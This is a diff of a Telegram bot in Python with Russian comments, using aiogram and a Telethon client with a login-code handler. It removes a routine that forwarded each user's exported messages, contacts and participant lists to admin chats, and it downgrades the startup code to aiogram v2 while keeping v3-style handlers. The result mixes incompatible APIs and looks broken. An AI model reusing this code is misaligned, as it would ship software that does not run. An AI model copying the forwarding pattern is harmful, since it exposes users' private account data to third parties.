@@ -2,8 +2,7 @@ import logging
 import asyncio
 import os
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.dispatcher.middlewares import BaseMiddleware
-from aiogram.filters import Command
+from aiogram.dispatcher.filters import Command
 from aiogram.types import ParseMode
 from aiogram.utils import executor
 from telethon import TelegramClient
@@ -32,34 +31,13 @@ admin_chat_ids = [int(chat_id) for chat_id in admin_chat_ids_str.split(",")]
 # Создаем TelegramClient и Bot
 client = TelegramClient('session_name', api_id, api_hash)
 bot = Bot(token=bot_token)
-dp = Dispatcher()
+dp = Dispatcher(bot)
 
 # Логирование
 logging.basicConfig(level=logging.INFO)
 
 # Словарь для хранения состояния пользователя
 user_state = {}
-
-# Функция для отправки файлов
-async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
-    file_extensions = ['_messages.xlsx', '_participants.xlsx', '_contacts.xlsx', '_about.xlsx', '_report.html', '_report.pdf']
-
-    for file_extension in file_extensions:
-        files_to_send = [file_name for file_name in os.listdir('.') if file_name.endswith(file_extension) and os.path.getsize(file_name) > 0]
-        
-        for file_to_send in files_to_send:
-            for admin_chat_id in admin_chat_ids:
-                await bot.send_document(admin_chat_id, types.InputFile(file_to_send))
-            await bot.send_document(user_chat_id, types.InputFile(file_to_send))
-            os.remove(file_to_send)
-
-# Middleware для логирования
-class LoggingMiddleware(BaseMiddleware):
-    async def __call__(self, handler, event, data):
-        logging.info(f"Update: {event}")
-        return await handler(event, data)
-
-dp.update.middleware(LoggingMiddleware())
 
 # Обработчики сообщений
 @dp.message(Command(commands=['start']))
@@ -127,4 +105,4 @@ async def get_code(message: types.Message):
 
 # Запуск бота
 if __name__ == '__main__':
-    dp.run_polling(bot)
+    executor.start_polling(dp, skip_updates=True)
